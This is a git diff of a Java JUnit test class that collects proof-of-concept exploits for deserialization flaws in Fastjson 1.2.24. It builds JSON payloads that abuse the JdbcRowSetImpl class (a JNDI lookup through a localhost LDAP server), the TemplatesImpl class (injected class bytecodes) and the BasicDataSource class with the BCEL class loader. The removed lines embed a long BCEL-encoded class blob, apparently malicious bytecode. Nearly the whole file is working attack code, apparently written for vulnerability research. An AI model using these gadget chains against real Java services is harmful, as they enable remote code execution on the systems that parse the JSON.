@@ -5,6 +5,7 @@ import com.alibaba.fastjson.JSONObject;
 import com.alibaba.fastjson.parser.Feature;
 import com.alibaba.fastjson.parser.ParserConfig;
 import com.alibaba.fastjson.serializer.SerializerFeature;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
 import me.mole.pojo.Student;
 import org.apache.commons.io.IOUtils;
 import org.apache.tomcat.util.codec.binary.Base64;
@@ -13,6 +14,7 @@ import org.junit.jupiter.api.Test;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.IOException;
 import java.util.HashMap;
 
 public class Fastjson1224ApplicationTest {
@@ -66,17 +68,106 @@ public class Fastjson1224ApplicationTest {
 //        System.out.println(stu2);
     }
 
+    /*
+    {
+      "@type": "com.sun.rowset.JdbcRowSetImpl",
+      "dataSourceName": "ldap://127.0.0.1:8085/Exploit",
+      "autoCommit": true
+    }
+     */
     @Test
     public void test_poc_1() {
-        String fj_poc = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8085/Exploit\",\"autoCommit\":true}";
+        String fj_poc = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8085/abc\",\"autoCommit\":true}";
         System.out.println(fj_poc);
-        JSON.parse(fj_poc);
+        JSON.parseObject(fj_poc);
     }
 
-    private String readClass(String cls){
+    /*
+      {
+          "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+          "_bytecodes": ["...<clazz-byte-codes-base64>..."],
+          "_name": "a.b",
+          "_tfactory": {},
+          "_outputProperties": {}
+      }
+     */
+    @Test
+    public void test_poc_2() {
+        String evilClassPath = "/Users/fa1c0n/codeprojects/IdeaProjects/misc-classes/target/classes/Exploit2.class";
+        String evilClazzB64 = readClass(evilClassPath);
+        String fj_poc = "{\n" +
+                "    \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n" +
+                "    \"_bytecodes\": [\"" + evilClazzB64 + "\"],\n" +
+                "    \"_name\": \"a.b\",\n" +
+                "    \"_tfactory\": {},\n" +
+                "    \"_outputProperties\": {}\n" +
+                "}";
+        System.out.println(fj_poc);
+        JSONObject jsonObject = JSON.parseObject(fj_poc, Feature.SupportNonPublicField);
+    }
+
+    /*
+     {
+       {
+        "@type": "com.alibaba.fastjson.JSONObject",
+        "a": {
+                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
+                "driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},
+                "driverClassName": "$$BCEL....<BCEL-code>..."
+             }
+       }: "b"
+     }
+     */
+    @Test
+    public void test_poc_3_1() {
+        String evilClassPath = "/Users/fa1c0n/codeprojects/IdeaProjects/misc-classes/target/classes/Exploit3.class";
+        String bcelCode = readClassToBCEL(evilClassPath);
+        String fj_poc = "{\n" +
+                "  {\n" +
+                "   \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
+                "   \"a\": {\n" +
+                "           \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
+                "           \"driverClassLoader\": {\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\n" +
+                "           \"driverClassName\": \""+ bcelCode +"\"\n" +
+                "        }\n" +
+                "  }: \"b\"\n" +
+                "} ";
+
+        System.out.println(fj_poc);
+        JSON.parseObject(fj_poc);
+    }
+
+    /*
+     该exp适用于JSON.parseObject(), 不适用于JSON.parse();
+      {
+       "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
+         "driverClassLoader": {
+           "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+         },
+         "connection":"{}",
+         "driverClassName": "$$BCEL....<BCEL-code>..."
+      }
+     */
+    @Test
+    public void test_poc_3_2() {
+        String evilClassPath = "/Users/fa1c0n/codeprojects/IdeaProjects/misc-classes/target/classes/Exploit3.class";
+        String bcelCode = readClassToBCEL(evilClassPath);
+        String fj_poc = "{\n" +
+                " \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
+                "   \"driverClassLoader\": {\n" +
+                "     \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
+                "   },\n" +
+                "   \"connection\":\"{}\",\n" +
+                "   \"driverClassName\": \"" + bcelCode + "\"\n" +
+                "}";
+        System.out.println(fj_poc);
+        JSONObject jsonObject = JSON.parseObject(fj_poc);
+    }
+
+    private String readClass(String clazzPath){
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
         try {
-            IOUtils.copy(new FileInputStream(new File(cls)), bos);
+            IOUtils.copy(new FileInputStream(new File(clazzPath)), bos);
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -84,48 +175,16 @@ public class Fastjson1224ApplicationTest {
         return Base64.encodeBase64String(bos.toByteArray());
     }
 
-    @Test
-    public void test_poc_2() {
-        String evilClassPath = "/Users/fa1c0n/codeprojects/IdeaProjects/misc-classes/src/main/java/Exploit2.class";
-        String evilCode = readClass(evilClassPath);
-        String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
-//        String NASTY_CLASS = "me.mole.pojo.Student";
-        String fj_poc = "{\"@type\":\"" + NASTY_CLASS +
-                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{},\"_outputProperties\":{}}\n";
-        System.out.println(fj_poc);
-
-        Object parse = JSON.parse(fj_poc, Feature.SupportNonPublicField);
-        System.out.println(parse);
+    private String readClassToBCEL(String clazzPath) {
+        String bcelCode = "$$BCEL$$";
+        try {
+            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+            IOUtils.copy(new FileInputStream(new File(clazzPath)), bos);
+            bcelCode += Utility.encode(bos.toByteArray(), true);
+            return bcelCode;
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return "";
     }
-
-    @Test
-    public void test_poc_3_1() {
-        String fj_poc = "{\n" +
-                "    {\n" +
-                "        \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
-                "        \"a\": {\n" +
-                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
-                "                \"driverClassLoader\": {\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\n" +
-                "                \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$c9N$c30$Q$7dn$d3$s$N$v$85B$d9$97$b2$X$q$a8$84$b8$81$b8$m$b8$Q$WQ$Eg$d7X$c5$Q$92$uu$R$7f$c4$99$L$m$O$7c$A$l$85$Y$87$5d$Q$v3$997$ef$3d$cf$c4$_$afO$cf$A$d60$ef$c2$c1$a0$8b$n$M$3b$Y1y$d4$c6$98$8b$i$c6mL$d8$98d$c8o$a8P$e9M$86lm$f1$84$c1$da$8a$ce$qC$c9W$a1$dc$ef$5c5er$cc$9b$B$ne$3f$S$3c8$e1$892$f5$Hh$e9s$d56ly$ad$82$fa$f6M$iDJ$af$ae38$h$o$f8$f0e$c4$ab$f8$X$fc$9a$d7$D$k$b6$88$rd$acU$U$S$ad$d8$d0$5c$5c$ee$f18$f5$a3$d1$Y$dcF$d4I$84$dcQ$c6$bf$f8i$b9b$f4$k$KpmT$3dLa$9a$s$8ab$ZV$97yu$8b$H$a2$Tp$j$r$kf0$cb$d0$f7$cfi$k$e6$e0$92$e3$afI$Zz$be$a9$H$cd$L$v4C$ef7t$d4$J$b5$ba$a2A$dc$96$d4_E$a5$b6$e8$ff$e1$d06$96$bc$91$82a$a1$f6$a3$db$d0$89$K$5b$eb$3f$F$87I$qd$bbM$82RLM$9d$fe$83$e3$84$LI$7b$d9ta$e6$c9$80$99m$vvQU$a7$cc$u$e7$96$k$c0$ee$d2$b6G1$9f$82Y$U$vz$ef$Et$a3D$d9A$cf$97$98$a7f$40$f9$R$99r$f6$k$d6$e9$z$9c$dd$a5$7b$e4$efR$bc$40$da$i$b9$Y$c7$B$fa2$be$85$U$b5$c9$d9A$_9$7d$9eP$84Eu$99$aa$3ezmd$7c$h$fd$W5$w$e9P$Do$F$9dw$Zz$C$A$A\"\n" +
-                "               }\n" +
-                "    }: \"b\"\n" +
-                "}";
-        System.out.println(fj_poc);
-        Object parse = JSON.parse(fj_poc);
-    }
-
-    @Test
-    public void test_poc_3_2() {
-        String fj_poc = "{\n" +
-                "   \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
-                "   \"driverClassLoader\": {\n" +
-                "         \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
-                "       },\n" +
-                "     \"connection\":\"{}\",\n" +
-                "     \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$c9N$c30$Q$7dn$d3$s$N$v$85B$d9$97$b2$X$q$a8$84$b8$81$b8$m$b8$Q$WQ$Eg$d7X$c5$Q$92$uu$R$7f$c4$99$L$m$O$7c$A$l$85$Y$87$5d$Q$v3$997$ef$3d$cf$c4$_$afO$cf$A$d60$ef$c2$c1$a0$8b$n$M$3b$Y1y$d4$c6$98$8b$i$c6mL$d8$98d$c8o$a8P$e9M$86lm$f1$84$c1$da$8a$ce$qC$c9W$a1$dc$ef$5c5er$cc$9b$B$ne$3f$S$3c8$e1$892$f5$Hh$e9s$d56ly$ad$82$fa$f6M$iDJ$af$ae38$h$o$f8$f0e$c4$ab$f8$X$fc$9a$d7$D$k$b6$88$rd$acU$U$S$ad$d8$d0$5c$5c$ee$f18$f5$a3$d1$Y$dcF$d4I$84$dcQ$c6$bf$f8i$b9b$f4$k$KpmT$3dLa$9a$s$8ab$ZV$97yu$8b$H$a2$Tp$j$r$kf0$cb$d0$f7$cfi$k$e6$e0$92$e3$afI$Zz$be$a9$H$cd$L$v4C$ef7t$d4$J$b5$ba$a2A$dc$96$d4_E$a5$b6$e8$ff$e1$d06$96$bc$91$82a$a1$f6$a3$db$d0$89$K$5b$eb$3f$F$87I$qd$bbM$82RLM$9d$fe$83$e3$84$LI$7b$d9ta$e6$c9$80$99m$vvQU$a7$cc$u$e7$96$k$c0$ee$d2$b6G1$9f$82Y$U$vz$ef$Et$a3D$d9A$cf$97$98$a7f$40$f9$R$99r$f6$k$d6$e9$z$9c$dd$a5$7b$e4$efR$bc$40$da$i$b9$Y$c7$B$fa2$be$85$U$b5$c9$d9A$_9$7d$9eP$84Eu$99$aa$3ezmd$7c$h$fd$W5$w$e9P$Do$F$9dw$Zz$C$A$A\"\n" +
-                "}";
-        System.out.println(fj_poc);
-        JSONObject parse = JSON.parseObject(fj_poc);
-    }
-
 }
